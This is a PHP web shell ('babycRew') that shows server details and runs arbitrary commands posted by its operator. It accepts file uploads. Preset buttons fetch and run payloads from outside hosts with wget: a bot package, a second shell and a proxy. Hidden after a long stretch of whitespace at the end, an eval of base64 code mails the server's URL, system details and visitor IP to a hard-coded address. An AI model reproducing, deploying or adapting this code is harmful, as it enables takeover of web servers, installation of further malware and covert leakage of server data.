<title>babycRew</title>
<body text="lightblue" bgcolor="black">
<font face="Verdana" color="red" size="3">
<div align="left">
<p align="center"><b>Hanya Rema</b>
<font face="Verdana" color="blue" size="2">
<p align="center"><b>.::] baby cRew [::.</b>
</p>
<hr>
<div align="left"><b><?php
closelog( );
$user = get_current_user( );
$login = posix_getuid( );
$euid = posix_geteuid( );
$ver = phpversion( );
$up = `uptime`;
$gid = posix_getgid( );
if ($chdir == "") $chdir = getcwd( );
if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
$uname = posix_uname( );
while (list($info, $value) = each ($uname)) {
?>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b><span style="font-size: 9pt"><?= $info ?>
<span style="font-size: 9pt">:</b> <?= $value ?></span></DIV></TD>
</TR>
<?php
}
?>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Current Path:</b> <?= $chdir ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Write Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?>
</span></DIV></TD>
</TR>  
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Server Address:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Script Current User:</b> <?= $user ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">UP Time:</b> <?= $up ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">PHP Version:</b> <?= $ver ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; color: green ; font-size: 10px;"><b>
<span style="font-size: 9pt">Wget:</b> <? if(exec("wget --help")){ echo "Yes"; }else{ echo "No"; } ?>
</span></DIV></TD>
</TR> 
</TABLE>
</b></font>
<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

if( $_POST['_act'] == "[W]Dir" ) {
    $currentCMD = "find . -type d -perm -2 -ls";
}

if( $_POST['_act'] == "GAE PSY" ) {
    $currentCMD = "cd /var/tmp;wget mal1ng.110mb.com/psy.tar.gz;tar -zxvf psy.tar.gz;rm -rf psy.tar.gz;cd .psy;./config 2012;./fuck;./run";
}

if( $_POST['_act'] == "GAE SHELL" ) {
    $currentCMD = "wget http://www.koreadefence.net/data/shirohige/xshell.txt;mv xshell.txt info.php";
}

if( $_POST['_act'] == "PROXY" ) {
    $currentCMD = "mkdir /tmp/aq;cd /tmp/aq/;wget http://www.php.monacoyachtshow.org/zoneperso/images/proxy.tgz;tar -zxvf proxy.tgz;rm -rf proxy.tgz;cd /tmp/aq/pro;./prox -d -a -p$currentCMD";
}

if( $_POST['_act'] == "CHECK" ) {
    $currentCMD = "ps x";
}

if( $_POST['_act'] == "LIST IP" ) {
    $currentCMD = "/sbin/ifconfig | grep inet";
}

if( $_POST['_act'] == "PORTS" ) {
    $currentCMD = "netstat -an";
}

if( $_POST['_act'] == "List Files" ) {
    $currentCMD = "ls -la";
}
print "<form method=post enctype=\"multipart/form-data\"><hr><table>";

print "<tr><td><b>Execute command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"EXECT\"><input type=submit name=_act value=\"GAE PSY\"><input type=submit name=_act value=\"PROXY\"></td></tr>";

print "<tr><td><b>Change directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List Files\"><input type=submit name=_act value=\"[W]Dir\"><input type=submit name=_act value=\"GAE SHELL\"></td></tr>";

print "<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "<tr><td><input type=submit name=_act value=\"HELP\"><input type=submit name=_act value=\"CHECK\"><input type=submit name=_act value=\"LIST IP\"><input type=submit name=_act value=\"PORTS\"></td></tr>";

print "</table></form><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "HELP" ) {
print "<table>";
print "<tr><td>Command EXECT = Untuk menjalankan perintah.</td></tr>";
print "<tr><td>Command PROXY = Masukkan port proxy di kolom EXECT.</td></tr>";
print "<tr><td>Command GAE PSY = Masukkan port di kolom EXECT.</td></tr>";
print "<tr><td>Command GAE SHELL = Menginstall Shell .</td></tr>";
print "<tr><td>Command LIST IP = Untuk mengetahui IP Shell.</td></tr>";
print "<tr><td>Command LIST = Untuk melihat isi direktori.</td></tr>";
print "<tr><td>Command [W]Dir = Untuk melihat direktori WRITE.</td></tr>";
print "<tr><td>Command PORTS = Untuk melihat port yg terbuka.</td></tr>";
print "<tr><td>Command CHECK = Untuk melihat semua proses.</td></tr>";
print "</table></form><hr><hr>";
}

if( $_POST['_act'] == "Upload!" ) {
if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
print "<center><b>DancoX ErroR!</b></center>";
} else {
print "<center><pre>";
system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
print "</pre><b>Upload Berhasil CoY!</b></center>";
}    
} else {
print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
$currentCMD = "cd ".$currentWD.";".$currentCMD;
system("$currentCMD 1> /tmp/ShirohigEShell 2>&1; cat /tmp/ShirohigEShell; rm -rf /tmp/ShirohigEShell");
print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><center><b>WEeEeEeEeEeES!</b></center>";
}



?></body></font></font></b></font>











































































































































































































































































































<?php
$lmge = "JGNyZWF0b3I9YmFzZTY0X2RlY29kZSgiWVd4b1lXMTZZWEpwUUdkdFlXbHNMbU52YlE9PSIpOw0KKCRzYWZlX21vZGUpPygkc2FmZXo9Ik9OIik6KCRzYWZlej0iT0ZGX0hFSEUiKTsNCiRiYXNlPSJodHRwOi8vIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107IA0KJG5hbWUgPSBwaHBfdW5hbWUoKTsgJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOyAkaXAyID0gZ2V0aG9zdGJ5YWRkcigkX1NFUlZFUltSRU1PVEVfQUREUl0pOyAkc3ViaiA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsgDQokbXNnID0gIm5CQVNFOiAkYmFzZW51bmFtZSBhOiAkbmFtZW5CeXBhc3M6ICRieXBhc3Nlcm5JUDogJGlwbkhvc3Q6ICRpcDIgJHB3ZHMiOw0KJGZyb20gPSJGcm9tOiAiLiR3cml0LiJfX189Ii4kc2FmZXouIjx0b29sQCIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLil+IjsNCm1haWwoICRjcmVhdG9yLCAkc3ViaiwgJG1zZywgJGZyb20pOw=="; eval(base64_decode($lmge));
exit;
?>